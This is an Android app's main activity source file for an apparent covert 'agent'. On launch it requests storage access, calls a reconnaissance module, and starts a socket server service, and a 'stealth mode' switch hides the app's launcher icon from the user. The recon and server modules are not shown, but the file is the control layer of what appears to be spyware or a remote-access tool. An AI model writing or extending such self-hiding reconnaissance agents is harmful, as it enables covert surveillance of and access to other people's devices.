package com.mobilemorph.agent;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.Manifest;
import android.util.Log;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.Button;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.provider.Settings;

import com.mobilemorph.agent.ReconModule;
import com.mobilemorph.agent.services.ServerSocketService;
import com.mobilemorph.agent.UpdateChecker;

public class MainActivity extends Activity {
    private static final int REQUEST_PERMISSIONS = 100;
    private static final String TAG = "MainActivity";
    private SharedPreferences prefs;
    private Button startAgentButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        prefs = getSharedPreferences("agent", MODE_PRIVATE);

        // Show Android ID (Device ID)
        TextView deviceIdText = findViewById(R.id.deviceIdText);
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        deviceIdText.setText("Device ID: " + deviceId);

        // Setup Start Agent Button
        startAgentButton = findViewById(R.id.startAgentButton);
        startAgentButton.setOnClickListener(v -> {
            if (!hasStoragePermissions()) {
                Toast.makeText(this, "Permission required to start agent", Toast.LENGTH_SHORT).show();
                return;
            }
            startAgentService();
            Toast.makeText(MainActivity.this, "Agent Started", Toast.LENGTH_SHORT).show();
        });

        // Enable button only if permissions granted
        startAgentButton.setEnabled(hasStoragePermissions());

        // Stealth mode toggle
        Switch serverToggle = findViewById(R.id.serverToggle);
        boolean stealth = prefs.getBoolean("stealth_mode", false);
        serverToggle.setChecked(stealth);
        serverToggle.setOnCheckedChangeListener((buttonView, isChecked) -> {
            prefs.edit().putBoolean("stealth_mode", isChecked).apply();
            if (isChecked) {
                hideLauncherIcon();
                Toast.makeText(this, "Stealth mode activated", Toast.LENGTH_SHORT).show();
            } else {
                showLauncherIcon();
                Toast.makeText(this, "Stealth mode disabled", Toast.LENGTH_SHORT).show();
            }
        });

        requestRuntimePermissions(); // Will auto-start service if permission is granted
    }

    private boolean hasStoragePermissions() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                == PackageManager.PERMISSION_GRANTED;
    }

    private void requestRuntimePermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !hasStoragePermissions()) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
                    REQUEST_PERMISSIONS);
        } else {
            startAgentService();
            startAgentButton.setEnabled(true);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSIONS && grantResults.length > 0 &&
                grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            startAgentService();
            startAgentButton.setEnabled(true);
        } else {
            Log.w(TAG, "Permission denied, agent not started.");
        }
    }

    private void startAgentService() {
        Log.d(TAG, "Starting agent service...");

        // Run optional recon/update logic
        ReconModule.runRecon(this);
        UpdateChecker.checkForUpdate(this);

        // Start the new ServerSocketService (ADB port forwarding based)
        ServerSocketService.startServer(this);
    }

    private void hideLauncherIcon() {
        new Handler().postDelayed(() -> {
            PackageManager pm = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            pm.setComponentEnabledSetting(componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
        }, 1000);
    }

    private void showLauncherIcon() {
        PackageManager pm = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        pm.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP);
    }
}
